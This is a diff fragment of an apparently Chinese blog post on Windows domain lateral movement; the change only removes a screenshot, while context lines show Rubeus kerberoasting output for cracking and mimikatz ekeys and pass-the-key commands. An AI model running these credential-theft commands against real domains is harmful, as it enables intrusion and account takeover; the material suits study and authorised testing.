@@ -196,7 +196,6 @@ html.dataset.dark = localStorage.dark;
 <p>2,Rubeus<br><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TGS包直接打印能够使用John或hashcat能够破解的Hash。</span><br><span class="line">Rubeus.exe kerberoast /format:john /outfile:kerberoasting.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://pingmaoer.github.io/2020/06/30/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%BA%8C/18.png"></p>
 <h2 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h2><p>pass the key （密钥传递攻击）<br>PTK（pass the key ） #利用的ekeys aes256进行的渗透测试（NTLM认证攻击）<br>当系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash失去了作用，但是可以通过PTK的攻击方式获取权限</p>
 <pre><code>mimikatz sekurlsa::ekeys
 mimikatz sekurlsa:pth /user:域用户名 /doamin:域名 /aes256:aes256值
